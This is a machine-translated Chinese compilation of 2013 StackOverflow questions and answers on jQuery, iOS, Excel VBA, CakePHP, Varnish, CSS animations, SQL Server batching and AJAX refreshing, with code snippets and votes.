# StackOverflow 问答 15443000-15443999

# jquery - 迭代并为每个段落添加类

> ID：15443001
> 
> 赞同：1
> 
> 时间：2013-03-15T22:19:39.313
> 
> 标签：jquery

我正在尝试为每个块的第一个 P 添加一个“忽略”类，并为最后一个 P 添加一个类“样式”。

```
<div class="tiles_large">
    <span class="spacer">&nbsp;</span>
       <p>image here</p>
    <span class="spacer">&nbsp;</span>
       <h4>headline here</h4>
    <span class="spacer">&nbsp;</span>
       <p>content here</p>
    <span class="spacer">&nbsp;</span>
    </div>

    <div class="tiles_small">
    <span class="spacer">&nbsp;</span>
       <p>image here</p>
    <span class="spacer">&nbsp;</span>
       <h4><div><span>headline here</span></div></h4>
    <span class="spacer">&nbsp;</span>
       <p>content here</p>
    <span class="spacer">&nbsp;</span>
    </div> 
```

这是我的 jquery，但它没有返回预期的结果。

```
 $(".tiles_large p,.tiles_small p").each(function() {
    $(this).find("p:first").addClass("ignore");
  });

  $(".tiles_large p,.tiles_small p").each(function() {
    $(this).find("p:last").addClass("style");
  }); 
```

[这是我的小提琴](http://jsfiddle.net/gsg3m/)

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2013-03-15T22:24:27.987

这是你想要的吗？[演示](http://jsfiddle.net/gsg3m/5/)。如果是这样，您不需要使用**.each**函数。

```
$(".tiles_large,.tiles_small").find("p:first").addClass("ignore").end().find("p:last").addClass("style"); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-15T22:25:36.780

您正在搜索 and 中的元素`p`，而它应该只是and 。`.tiles_large p``.tiles_small p``.tiles_large``.tiles_small`

更新导致[这个小提琴](http://jsfiddle.net/gsg3m/2/)

```
$(".tiles_large,.tiles_small").each(function () {
    $(this).find("p:first").addClass("ignore");
});

$(".tiles_large,.tiles_small").each(function () {
    $(this).find("p:last").addClass("style");
}); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-15T22:25:57.433

使用`.titles_large p:first,.titles_small p:first`并删除完整的`.find(...)`方法。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-15T22:25:00.493

这可以这样做：

```
$(".tiles_large, .tiles_small").each(function() {
    $("p:first", this).addClass("ignore");
    $("p:last", this).addClass("style");
}); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-03-15T22:33:14.967

当您运行时`.each`，您将重复将该功能应用于每个`<p>`被拾取的功能。认为您正在寻找类似的东西

```
$(".tiles_large p:first-of-type,.tiles_small p:first-of-type").addClass("ignore"); 
```

这基本上是@letiagoalve 发布的内容。我猜`first-of-type`是在 jQuery 1.9 中添加的。不确定它是否有任何特定的优势......

编辑：找到一个相关[线程](https://stackoverflow.com/questions/8531189/jquery-first-of-type-selector)，更多地讨论性能`.find("p").eq(0)`以及哪些浏览器可能支持或不支持`first-of-type`。我自己学到了一些新东西:)

# xcode - 导航栏是否有后退按钮

> ID：15443002
> 
> 赞同：1
> 
> 时间：2013-03-15T22:19:40.303
> 
> 标签：xcode, uistoryboard

Xcode 对象库包含一个 UINavigation Bar，它声称可以启用 Title 和 Back 按钮。“默认情况下，UINavigationBar 在左侧显示一个后退按钮，在中间显示一个标题，但除了在导航栏右侧提供一个可选按钮之外，您还可以为这些指定自定义视图。” 使用我的**故事板**和 UIView，我在模拟器中只看到标题，没有后​​退按钮。真实设备是否同时显示两者，还是我需要做更多的连接或 segue-code 才能看到“后退”按钮？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-15T22:49:29.067

如果您使用主从模板，那么您可以在详细视图中看到后退按钮。如果您使用过它并且没有后退按钮，那么这是一个阻止该特定项目使用它的错误。丢弃那个并使用一个新的。如果在广告详细视图时将导航控制器添加到现有项目，详细视图将有一个后退按钮。我希望这回答了你的问题。

编辑：

这是正确的，我的朋友。如果您不使用导航控制器，那么您将无法拥有该自动后退按钮，您可以通过编程方式构建它。

编辑1：

尝试以下。我在里面放了一些符号来澄清整个过程。

```
//create the button
UIButton *button = [UIButton buttonWithType:UIButtonTypeRoundedRect];

//specify the method attached to the button
[button addTarget:self action:@selector(goBack) forControlEvents:UIControlEventTouchDown];

//set the title for the button
 [button setTitle:@"My Button" forState:UIControlStateNormal];

 //set the button frame
 button.frame = CGRectMake(0, 0, 40.0, 40.0);

 //add the button to my view
 [myView addSubview:button]; 
```

这是前段时间写的旧代码，但它应该可以正常工作。按钮的框架设置在左侧，但如果需要，您可以更改它。在视图中声明这个确实加载方法。

# excel - VBA 文本框到单元格

> ID：15443007
> 
> 赞同：0
> 
> 时间：2013-03-15T22:20:06.123
> 
> 标签：excel, vba

我在 excel 中有一个输入用户表单，用户将数据输入到三个不同的文本框中。这是我的代码

```
 Private Sub Process_Click()

     Worksheets("1").Range("A1").Value = Date.Value
     Worksheets("1").Range("B1").Value = Name.Value
     Worksheets("1").Range("C1").Value = Amount.Value

     End Sub 
```

因此，当我第一次按下进程时，它会将数据写入这些单元格 A1、b1 和 C1。我想要做的是，每次我打开表单并单击表单上的进程时，我希望这些值向下排列，例如下次我单击进程时，它将转到 A2、b2 和 c2，等等在。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-15T22:30:31.383

这类似于 Barranka 的回答。

基本思想是一样的。您检查最后填充的行，并将数据附加到比该行低的一行。

此处用于查找最后填充的行的方法可能比使用`while`循环更有效，但您应该测试两者以亲自查看：

```
Private Sub Process_Click()
    Dim appendRow As Long

    ' add 1 to get the row after the last-populated row
    appendRow = Worksheets("1").Cells(Rows.Count,1).End(XlUp).Row + 1

    Worksheets("1").Range("A" & appendRow).Value = Date.Value
    Worksheets("1").Range("B" & appendRow).Value = Name.Value
    Worksheets("1").Range("C" & appendRow).Value = Amount.Value
 End Sub 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-15T22:28:38.110

首先，您需要知道哪个是最后填充的单元格。这可以通过导航范围轻松完成。假设所有三列都填充了数据，您只能读取其中一列（比如说`A`）来获​​取最后一行：

```
Dim i as Integer
i = 1
while Worksheets("1").Range("A" & i).Value <> "" or Worksheets("1").Range("A" & i).Value <> 0
    i = i + 1
wend 
```

现在您知道最后一行填充了：

```
 Worksheets("1").Range("A" & i).Value = Date.Value
 Worksheets("1").Range("B" & i).Value = Name.Value
 Worksheets("1").Range("C" & i).Value = Amount.Value 
```

这只是解决它的一种方法，如果您的数据集不是真的很大，它就可以工作。缺点是，如果您有一个很长的表，则`while`可能需要一些时间来跟踪最后填充的行。

希望这可以帮助你

# cakephp - CakePHP中的模拟电子邮件组件调用非对象上的成员函数

> ID：15443022
> 
> 赞同：0
> 
> 时间：2013-03-15T22:21:24.967
> 
> 标签：cakephp, model, mocking

我正在尝试在模型中模拟电子邮件组件，但是在第一个函数之后，Cake 给了我一个错误：错误：在非对象上调用成员函数 to()

这是我的测试课：

```
<?php
App::uses('User', 'Model');

class UserTest extends CakeTestCase {
.
.
// I'm not copying the setUp and tearDown methods here, but they are there.
.
.
    public function testEmailTest(){
        $CakeEmail  = $this->getMock('CakeEmail',array('to','subject'));
        $CakeEmail->expects($this->any())
                ->method('to')
                ->with($this->equalTo('ant@b.com'));
        $CakeEmail->expects($this->once())
                ->method('subject')
                ->with($this->equalTo('hi'));
        $this->User->CakeEmail = $CakeEmail;
        $result = $this->User->emailCat();
    }
} 
```

这是用户模型：

```
public $CakeEmail = null;

public function emailCat() {
    if ( !$this->CakeEmail){
        $this->CakeEmail = new CakeEmail();
    }
    $this->CakeEmail->subject('hi')
            ->to('ant@b.com')
            ->emailFormat('both')
            ->config('default')
            ->send('hi');

} 
```

蛋糕 v2.3.1。

也许有一种不同的方法可以在这个模拟函数上设置多个方法，但这是基于有人放在网上的解决方案。

（我知道我不应该从这里发送电子邮件，但是对于这个注册功能，我想将其保留在这里，以便在电子邮件未发送时可以回滚事务）。

# iphone - UIBarButtonItem - 以编程方式更改背景图像

> ID：15443023
> 
> 赞同：0
> 
> 时间：2013-03-15T22:21:26.693
> 
> 标签：iphone, ios, xcode, image, uibarbuttonitem

如何以编程方式更改**UIBarButtonItem**的背景图像？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-15T22:38:54.263

```
[yourbarButtonItem setBackButtonBackgroundImage:bckgrndImag forState:UIControlStateNormal barMetrics:0]; 
```

细节：

```
setBackButtonBackgroundImage:forState:barMetrics: 
```

为给定的控件状态和条形指标设置后退按钮背景图像

```
- (void)setBackButtonBackgroundImage:(UIImage *)backgroundImage forState:(UIControlState)state barMetrics:(UIBarMetrics)barMetrics 
```

**参数：**

```
backgroundImage 
```

用于后退按钮背景的图像。

```
state 
```

一种控制状态。

```
barMetrics 
```

条形指标。

**讨论**

此修饰符仅适用于导航栏后退按钮，并被其他按钮忽略。

为了获得良好的效果，backgroundImage 必须是可拉伸的图像。

**可用性**

在 iOS 5.0 及更高版本中可用。

**也可以看看**

```
– backButtonBackgroundImageForState:barMetrics:
– setBackButtonBackgroundVerticalPositionAdjustment:forBarMetrics: 
```

**宣布于**

```
UIBarButtonItem.h 
```

* * *

## 回答 #2

> 赞同：-2
> 
> 时间：2013-03-15T22:49:08.540

试试这个：

```
[yourButton setBackgroundImage:[UIImage imageNamed:@"MY_IMAGE"] forState:UIControlStateNormal barMetrics:UIBarMetricsDefault] 
```

更改`MY_IMAGE`为您想要的背景图像和`forState`参数，将其更改为您想要的任何一个：正常、选定、禁用等。

# highcharts - Highstock 数据分组添加点到不完整的系列

> ID：15443025
> 
> 赞同：0
> 
> 时间：2013-03-15T22:21:36.537
> 
> 标签：highcharts, highstock

我在涉及多个系列的 Highstock 图表中使用 dataGrouping，实际年份是任意的，但在这种情况下，其中一个系列是 2011 年，所有其他系列都是 2012 年。我注意到的是，当启用 dataGrouping 时，2011数据在 dec 有一个点。30 2012 和 2012 年的数据在 2011 年 1 月 1 日有一个点，因此在图表上画直线。当 dataGrouping 被禁用时，这不会发生，并且图表的行为与您预期的一样，一个系列刚刚结束，下一个系列开始。

有没有人注意到这一点？有没有办法避免它？到目前为止，我想出的解决方法是合并数据集，以便所有 2012 年系列都有 2011 年的数据。

谢谢

# sublimetext2 - 更改 Sublime Text 2 中的语法高亮显示

> ID：15443030
> 
> 赞同：4
> 
> 时间：2013-03-15T22:22:43.050
> 
> 标签：sublimetext2

如何更改 Sublime Text 2 的高亮设置，使引号之间的文本不会像那样变成粉红色并且几乎伤害我的眼睛？

**编辑：**忘了提，这发生在 LaTeX 文件中，我正在使用主题 Monokai（如果这很重要，不太确定）。

谢谢。

![在此处输入图像描述](../Images/daaa2d20094cc29a323a50863efaeaee.png)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-15T22:59:13.560

认为它是 LaTeX，但想确定一下。因此，有 2 个可能的修复方法。

首先是正确定义引号。也就是说，`"`不正确地使用渲染。[老实说，直到看到以下帖子（链接](http://www.johndcook.com/blog/2010/02/15/top-latex-mistakes/)），我才知道这一点。我认为这将是正确的做法。

第二种方法是修改tmLanguage文件。以下范围应用于该字符串`invalid.illegal.string.quoted.double.latex`。您可以从 tmLanguage 文件中删除关联的模式，它应该会阻止该突出显示的发生。如果你想走这条路，请告诉我，我可以提供一些关于如何做的额外说明。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-04-28T15:27:40.283

（我遇到了类似的问题并搜索了几个 StackOverflow Q&A 页面，但答案似乎不能满足我的需求）。好吧，很多人称赞 JSON 类型的配置文件，关于它的灵活性或其他......等等，但是没有一个用于样式配置器的实时 GUI（在 Sublime Text 的情况下进行配色方案编辑）真的很痛苦。新用户如何知道他应该在数千个键值对之间调整（只需要一到两个）哪个选项的**名称。**

如果您只需要从一个好的默认主题中更改一两件事，您可以使用这个网站来创建您自己的自定义主题文件。这家伙真的做得很好： [http ://tmtheme-editor.herokuapp.com/#/theme/Monokai](http://tmtheme-editor.herokuapp.com/#/theme/Monokai)

# php - 使用 PHP/Jquery 拖放文件以附加到电子邮件

> ID：15443032
> 
> 赞同：0
> 
> 时间：2013-03-15T22:22:47.507
> 
> 标签：php, jquery

我试图创建一个非常简单的票务系统。简而言之，它是这样的：

用户填写一些 HTML 表单字段，通过文件上传附加一到三个文件。提交时，表单及其内容通过 post 提交到 PHP 脚本，该脚本创建包含表单数据和附加文件的电子邮件。

我不需要将文件上传到服务器，但如果此过程需要，将它们保存在服务器上会有好处。

Jquery 拖放是我的偏好，但简单的 HTML 输入 type="file" 就可以了。

基本上我的问题是这样的；如何从表单字段将文件附加到电子邮件中？我可以将输入 type="file" 直接输入 PHP 电子邮件发送脚本吗？还是我需要将它们上传到我服务器上的物理位置，然后将该文件的链接附加到电子邮件中？

# configuration - 使用域名清漆配置

> ID：15443034
> 
> 赞同：0
> 
> 时间：2013-03-15T22:22:50.547
> 
> 标签：configuration, varnish

我已经配置了 Varnish，并且当使用 IP 地址指定主机时，配置工作正常。但是当主机被指定为域名时 Varnish 无法启动（比如 www.google.com）。

这行得通。Varnish 成功启动，功能上一切正常。

```
backend default {
    .host = "74.125.225.14";
    .port = "80";
} 
```

这不起作用，清漆无法启动：

```
backend default {
    .host = "www.google.com";
    .port = "80";
} 
```

知道什么可能是错的吗？

我现在没有日志，但一旦我可以访问它们就会更新问题。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-19T21:19:32.883

据我所知，Varnish 不支持主机名。相反，我们所做的是将 Apache（或其他支持主机名的代理）配置为侦听另一个本地端口并通过该代理发送 Varnish 流量。

# encoding - 如何对 NSString 进行 URL 编码

> ID：15443040
> 
> 赞同：8
> 
> 时间：2013-03-15T22:23:34.557
> 
> 标签：encoding, nsstring, nsurl

我正在尝试对字符串进行 url 编码，但 NSURLConnection 由于“错误的 url”而失败。这是我的网址：

```
 NSString *address = mp.streetAddress;
    NSString *encodedAddress = [address stringByAddingPercentEscapesUsingEncoding:NSUTF8StringEncoding];
    NSString *cityState= mp.cityState;
    NSString *encodedCityState = [cityState stringByAddingPercentEscapesUsingEncoding:NSUTF8StringEncoding];

    NSString *fullAddressURL = [NSString stringWithFormat:@"http://www.zillow.com/webservice/GetDeepSearchResults.htm?zws-id=<X1-ZWz1bivd5de5mz_8xo7s>&address=%@&citystatezip=%@", encodedAddress, encodedCityState];
    NSURL *url = [NSURL URLWithString:fullAddressURL]; 
```

以下是 API 调用 URL 的示例：

下面是一个为精确地址匹配“2114 Bigelow Ave”、“Seattle, WA”的地址调用 API 的示例：

```
http://www.zillow.com/webservice/GetDeepSearchResults.htm?zws-id=<ZWSID>&address=2114+Bigelow+Ave&citystatezip=Seattle%2C+WA 
```

由于某种原因，此 URL 无法连接。有人可以帮我吗？

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2013-03-16T04:06:52.437

您必须先编码您的 fullAddressURL，然后再将其发送到，`NSURL`而不是单独编码地址和 cityState。

```
NSString *address = @"2114 Bigelow Ave";
//NSString *encodedAddress = [address stringByAddingPercentEscapesUsingEncoding:NSUTF8StringEncoding];
NSString *cityState= @"Seattle, WA";
// NSString *encodedCityState = [cityState stringByAddingPercentEscapesUsingEncoding:NSUTF8StringEncoding];

NSString *fullAddressURL = [NSString stringWithFormat:@"http://www.zillow.com/webservice/GetDeepSearchResults.htm?zws-id=<X1-ZWz1bivd5de5mz_8xo7s>&address=%@&citystatezip=%@", address, cityState];
fullAddressURL = [fullAddressURL stringByAddingPercentEscapesUsingEncoding:NSUTF8StringEncoding];
NSLog(@"fullAddressURL: %@",fullAddressURL);

NSURL *url = [NSURL URLWithString:fullAddressURL]; 
```

我已经测试了上面的代码，它给了我与给定链接相同的输出`http://www.zillow.com/webservice/GetDeepSearchResults.htm?zws-id=<ZWSID>&address=2114+Bigelow+Ave&citystatezip=Seattle%2C+WA`

# css - 如何：在一个页面上有多个 CSS sprite

> ID：15443046
> 
> 赞同：0
> 
> 时间：2013-03-15T22:24:27.473
> 
> 标签：css, animation, sprite

所以我发现了这个

[http://jsfiddle.net/simurai/CGmCe/](http://jsfiddle.net/simurai/CGmCe/)

代码很简单，我能够集成到我的页面中。但是，当我在同一页面上制作第二个动画精灵时，它不起作用，因为似乎代码

```
-webkit-keyframes play {    from { background-position:    0px; }
     to { background-position: -500px; } }

@-moz-keyframes play {    from { background-position:    0px; }
     to { background-position: -500px; } }

@-ms-keyframes play {    from { background-position:    0px; }
     to { background-position: -500px; } }

@-o-keyframes play {    from { background-position:    0px; }
     to { background-position: -500px; } }

@keyframes play {    from { background-position:    0px; }
     to { background-position: -500px; } } 
```

全局应用于所有 css 动画，而不是专门应用于标有“hi”的 div

这确实是每个 ID 都需要更改的 TO 位置，关于如何放置多个 ID 有什么想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-15T22:31:31.137

您的意思是分别控制每个对象的动画吗？ [http://jsfiddle.net/CGmCe/1738/](http://jsfiddle.net/CGmCe/1738/)

如果是这样，只需为其他 DIV 创建单独的 ID

```
.hi {
    width: 50px;
    height: 72px;
    background-image: url("http://files.simurai.com/misc/sprite.png");
}
#hi1 {
    -webkit-animation: play .8s steps(10) infinite;
       -moz-animation: play .8s steps(10) infinite;
        -ms-animation: play .8s steps(10) infinite;
         -o-animation: play .8s steps(10) infinite;
            animation: play .8s steps(10) infinite;
}

#hi2 {
    -webkit-animation: play .4s steps(10) infinite;
       -moz-animation: play .4s steps(10) infinite;
        -ms-animation: play .4s steps(10) infinite;
         -o-animation: play .4s steps(10) infinite;
            animation: play .4s steps(10) infinite;
} 
```

和 HTML：

```
<img src="http://files.simurai.com/misc/sprite.png" />
<div class="hi" id="hi1"></div>
<div class="hi" id="hi2"></div> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-15T22:54:16.407

当你使用

```
 @keyframes play {
        from { background-position:    0px; }
        to { background-position: -500px; } 
 } 
```

您创建一组称为**play**的关键帧。后面的文字`@keyframes`是标识符；在这种情况下，“play”只是此配置的名称。然后对于一个元素，你告诉它使用什么动画，在你的情况下，你告诉它使用**播放**帧集。

在您的小提琴中，您的`.hi`元素具有以下动画：

```
animation: play .8s steps(10) infinite; 
```

这里的“播放”只是为关键帧声明的标识符，而不是运行动画的命令。

如果您想拥有超过 1 个不同的动画，则可以使用 2 个不同的动画，并为它们提供不同的标识符（即“play”和“animation2”或其他）。

例如，在您的示例中[使用相同的精灵](http://jsfiddle.net/9MkZg/1/)：

```
<img src="http://files.simurai.com/misc/sprite.png" />
<div class="hi"></div>
<div class="bye"></div> 
```

还有 CSS（注意我没有使用所有可能的浏览器前缀，动画被称为**longwave**和**shortwave**）：

```
.hi {
    width: 50px;
    height: 72px; border: 1px dashed red;
    background-image: url("http://files.simurai.com/misc/sprite.png");

-webkit-animation: longwave .8s steps(10) infinite;
        animation: longwave .8s steps(10) infinite;
}

.bye {width: 50px; height: 72px; border: 1px dashed magenta;
    background-image: url("http://files.simurai.com/misc/sprite.png");
 -webkit-animation: shortwave .8s steps(5) infinite;
}

@-webkit-keyframes longwave {
   from { background-position:    0px; }
     to { background-position: -500px; }
}
@keyframes longwave {
   from { background-position:    0px; }
     to { background-position: -500px; }
}

@-webkit-keyframes shortwave {
   from { background-position: -150px; }
     to { background-position: -400px; }
}
@keyframes shortwave {
   from { background-position: -150px; }
     to { background-position: -400px; }
} 
```

[W3C 规范 动画文档](http://www.w3.org/TR/css3-animations/)（CSS 动画模块第 3 级，第 2 节）

[Mozilla 开发者网络动画教程中的更多详细信息](https://developer.mozilla.org/en-US/docs/CSS/Tutorials/Using_CSS_animations)

# java - 使用不提供 WADL 的 REST 服务

> ID：15443049
> 
> 赞同：1
> 
> 时间：2013-03-15T22:24:27.813
> 
> 标签：java, rest, jersey, jax-rs, wadl

我需要使用具有相对简单和固定的 REST 服务（这意味着可以预见的结构不是很变体），但我在他们网站的任何地方都找不到 WADL。我以前使用过 SOAP 服务，它有一个不错的 WSDL，我用它来生成我的 Java 类，我的客户端应用程序使用 Axiom2 将服务数据编组到这些类。

我的问题是：是否有一种简单的方法来逆向工程一个 WADL，如果站点缺少相应的 Java 类，使用它可以轻松地生成相应的 Java 类，使用 JAX-RS 的某些实现（例如 Jersey）？另一种方法是：只给定一个 REST 服务，没有 WADL 和某种形式的 JAX-RS，在客户端生成编组类的最简单方法是什么？

目前，由于结构简单，我使用 Java SE ( `org.w3c.dom`) 中的直接 DOM 来解析文档是一种艰难的方式。它工作得很好，但我不喜欢在文档结构中必须做的所有遍历，我觉得我重新发明了轮子。我相信有一种更优雅的方式。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-16T00:02:41.547

如果你只做一次，为什么不用手做呢？如果您需要定期执行此操作，那么您可能会在 WADL 上不走运（顺便看看：[https ://softwareengineering.stackexchange.com/questions/133145/should-i-use-wadl-to-describe-my-宁静的API](https://softwareengineering.stackexchange.com/questions/133145/should-i-use-wadl-to-describe-my-restful-api)）。

您只是想从服务中为 DTO 生成 Java 类吗？在这种情况下，您可以从服务中获取一些示例 XML，并使用它来生成可能的 XSD（可能使用[trang](http://www.thaiopensource.com/relaxng/trang.html)）。然后使用 XJC 生成相应的 Java 类。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-16T03:42:42.607

如果 REST 服务在 Jersey 中实现，Jersey 应该在运行时自动生成 WADL。默认位置是`http://server:port/appcontextroot/application.wadl`。如果 REST 服务使用其他实现，例如 RESTEasy，那么您就不走运了。[https://issues.jboss.org/browse/RESTEASY-166](https://issues.jboss.org/browse/RESTEASY-166)

# sql - SQL Server - 需要回填具有十亿条记录的表中的列

> ID：15443050
> 
> 赞同：2
> 
> 时间：2013-03-15T22:24:29.033
> 
> 标签：sql, sql-server-2008, bulkinsert

我需要将 datetime 列回填到现有的具有十亿条记录的 sql server 表 (A) 中。我在主键（ID）上将目标表（A）与父表（B）内部连接，然后检索日期。不幸的是，我在日期列上没有索引，这导致更新非常慢。我无法在 Date 列（包含 ID）上创建索引，因为在线索引创建占用了整个 tlog（最大 150gb）并且离线索引构建超出了范围。

```
UPDATE  A
    SET A.DATE = ZZ.DATE
FROM    A
        INNER JOIN
        (SELECT TOP 100000 A.ID,
                           B.DATE
         FROM   A WITH (NOLOCK)
                INNER JOIN
                B WITH (NOLOCK)
                -- parent table
                ON A.ID = B.ID
         WHERE  A.DATE IS NULL) AS ZZ
        ON ZZ.ID = A.ID; 
```

任何专家建议以更快或更有效的方式执行回填。

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-15T22:32:39.930

听起来像是分块更新的案例。顺便说一句，最近有一篇关于这个主题的非常详尽的文章（[http://www.sqlperformance.com/2013/03/io-subsystem/chunk-deletes](http://www.sqlperformance.com/2013/03/io-subsystem/chunk-deletes)）。它处理日志管理问题。

基本上，您应该将所做的更新分成尽可能大的批次，同时不会导致过多的日志使用。您可以在 A 上拆分（更新 A.ID 的范围）或在 b 上拆分（根据 B 上索引的某些数据范围（例如聚集索引或任何其他索引）从 B 中提取数据。

使用 选择一系列行`WHERE ID BETWEEN @a AND @b`。如果`ID`被索引，您可以避免表扫描并且可以进行增量数据拉取。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-16T08:47:27.563

请尝试以下代码，它删除了一次性内部连接，并按批次提交。删除一次性哈希连接可能对您没有太大帮助，但也许值得一试。

另一件事是，您提到您不能进行在线索引创建，您可以进行在线索引更新/重新构建，您可以将日期列添加到 ID 上的集群索引中，将您的 [日期] 包含在集群索引中. 由于在我的查询中，where 子句有 ID 作为条件，还有 [date]，所以，如果你可以将 [date] 添加到你的 ID 索引中，它将对性能有很大帮助，它不会有表扫描，只有簇索引搜索。

```
 DECLARE @ID BIGINT
SELECT @ID = MIN(ID) FROM A
WHILE @ID < IDENT_CURRENT('DBO.A')
BEGIN
    BEGIN TRAN
        UPDATE A
        SET A.DATE = B.DATE
        FROM A
        INNER JOIN B (nolock)
        ON A.ID = B.ID
        WHERE A.ID BETWEEN @ID AND @ID + 100000
        AND A.DATE IS NULL
    COMMIT TRAN
    SET @ID = @ID + 100000
END 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-17T03:16:15.060

```
UPDATE  A
    SET A.DATE = ZZ.DATE
FROM    A
        INNER JOIN
        (SELECT  A.ID, B.DATE
         FROM   A WITH (NOLOCK)
                INNER JOIN
                B WITH (NOLOCK)
                ON A.ID = B.ID

         WHERE  A.DATE IS NULL AND A.ID BETWEEN @a and @a + 100000
) AS ZZ
ON ( ZZ.ID = A.ID )
SET @X = @X + 100000
WAITFOR DELAY '00:00:05'
END 
```

# javascript - 按下按钮后使用 AJAX 和 FORM 自动刷新 DIV

> ID：15443052
> 
> 赞同：1
> 
> 时间：2013-03-15T22:24:37.880
> 
> 标签：javascript, ajax, html, refresh, intervals

我有一个简单的 javascript，我使用 AJAX 为 DIV 提供来自脚本的内容。这仅在用户单击按钮后发生。用户按下按钮（一次）并且 DIV 填充了脚本的 de 输出后我想要什么：

1.  禁用按钮
2.  让 DIV 使用 AJAX 每 5 秒重新加载一次脚本的输出

    <脚本语言="Javascript">

> ```
>  function xmlhttpPost(strURL) {
>         var xmlHttpReq = false;
>         var self = this;
>         // Mozilla/Safari
>         if (window.XMLHttpRequest) {
>             self.xmlHttpReq = new XMLHttpRequest();
>         }
>         // IE
>         else if (window.ActiveXObject) {
>             self.xmlHttpReq = new ActiveXObject("Microsoft.XMLHTTP");
>         }
>         self.xmlHttpReq.open('POST', strURL, true);
>         self.xmlHttpReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
>         self.xmlHttpReq.onreadystatechange = function() {
>             if (self.xmlHttpReq.readyState == 4) {
>                 updatepage(self.xmlHttpReq.responseText);
>             }
>         }
>         self.xmlHttpReq.send(getquerystring());
>     } 
> ```

```
 function getquerystring() {
        var form = document.forms['f1'];
        var xword = form.xword.value;
        qstr = 'addpost=' + escape(xword);  // NOTE: no '?' before querystring
        return qstr;
    }

    function updatepage(str){
        document.getElementById("result").innerHTML = str;
    }
    </script>
    <form name="f1">
      <input name="xword" type="hidden" value="someword"> 
      <input value="betaling gereed" type="button" name="btn" onclick='JavaScript:xmlhttpPost("script.php")'></p>
      <div id="result"></div>
    </form> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-15T22:47:17.237

您正在寻找 JS 时间事件？

[w3shools jvascript 时间事件](http://www.w3schools.com/js/js_timing.asp)

```
onclick="setInterval(func(), 5000)" 
```

**好的编辑：**

我没测试，太晚了

```
<input id="loadStuffButton" value="betaling gereed" type="button" name="btn" onclick='setInterval(xmlhttpPost("script.php"), 5000);'></p>

function xmlhttpPost(strURL) {
    document.getElementById('loadStuffButton').disabled = true; 
....
} 
```

**编辑 2：在** 没有 Ajax 的情况下测试这个快速而肮脏的东西，以展示 setIntervalworks 如何使用 5 毫秒呵呵

```
<form name="f1">
    <input name="xword" type="hidden" value="someword"> 
    <input id="loadStuffButton" value="betaling gereed" type="button" name="btn" onclick='setInterval(function(){xmlhttpPost("script.php")}, 500);'></p>
    <div id="result">
        test

    </div>
</form>
<script>
    i = 1;
    function xmlhttpPost(strURL) {
        document.getElementById('loadStuffButton').disabled = true; 
        updatepage(i++);
    }

    function updatepage(str){
        document.getElementById("result").innerHTML = str;

    }
</script> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-15T22:47:26.450

使用`setTimeout()`javascript方法如下：

```
setTimeout ('xmlhttpPost("script.php")', 5000); 
```

在你的`updatepage()`方法结束时，调用它。

例如：

```
function updatepage(str){
    document.getElementById("result").innerHTML = str;
    setTimeout ('xmlhttpPost("script.php")', 5000);
    } 
```

要禁用按钮，您需要在按钮标签中添加一个 id 属性。然后你可以像这样禁用：

```
document.getElementById('btn').disable(); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-15T23:07:02.127

无限期地重复ajax调用：

```
var refresh = false,
    btn = document.getElementById("btn");

btn.onclick = function(){
    refresh = true;
    this.disable();
    fetchData("script.php");
}

function fetchData(strURL){
    while(refresh){
        setTimeout(xmlhttpPost(strURL), 5000);
    }
} 
```

和：

```
<form name="f1">
    <input name="xword" type="hidden" value="someword"> 
    <input value="betaling gereed" type="button" id="btn" name="btn"></p>
    <div id="result"></div>
</form> 
```

# sql-server - SQL Server 正则表达式

> ID：15443057
> 
> 赞同：0
> 
> 时间：2013-03-15T22:25:03.407
> 
> 标签：sql-server, regex

我正在尝试编写一个 SQL 以仅在没有匹配的右大括号时才选择记录，例如，如果该列`"TEXT_DATA"`有`'tes(ting(sql)select'`，`'tes(ting(sql)sel)ect'`那么 select 语句应该只返回`'tes(ting(sql)select'`，因为它缺少匹配的右大括号`")"`。

可能缺少一个或多个右括号。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-15T22:32:32.897

不使用正则表达式，但它会完成这项工作：

```
Select text_data as [TEXT_DATA], 
    len(text_data)-len(replace(text_data, '(', '')) as [CountOpen], 
    len(text_data)-len(replace(text_data,')','')) as [CountClose] 
    into #temp 
    from table

Select TEXT_DATA from #temp where CountOpen<>CountClose 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-16T03:44:32.270

SQL Server 不支持复杂的正则表达式。您无法使用 TSQL 进行检查。您将需要编写自定义代码。

# ios - 使用 GCD 和代码重用：避免可重入代码死锁

> ID：15443058
> 
> 赞同：4
> 
> 时间：2013-03-15T22:25:12.573
> 
> 标签：ios, multithreading, grand-central-dispatch, deadlock, reentrancy

我正在使用 GCD 为类添加线程安全性。

我的类的一些公共方法被类中的其他公共方法调用。但是，这会导致重入锁定问题：如果我使用同步 GCD 块（在某些情况下）保护适当的公开可见方法，则重用意味着有时我会尝试在当前队列上运行另一个同步块，从而导致死锁。

什么是最优雅的解决方案？一个明显的方法是拥有适当方法的内部版本，没有任何 GCD 块，以及具有 GCD 块包装对内部方法的调用的方法的外部公共版本。这对我来说不太合适。

* * *

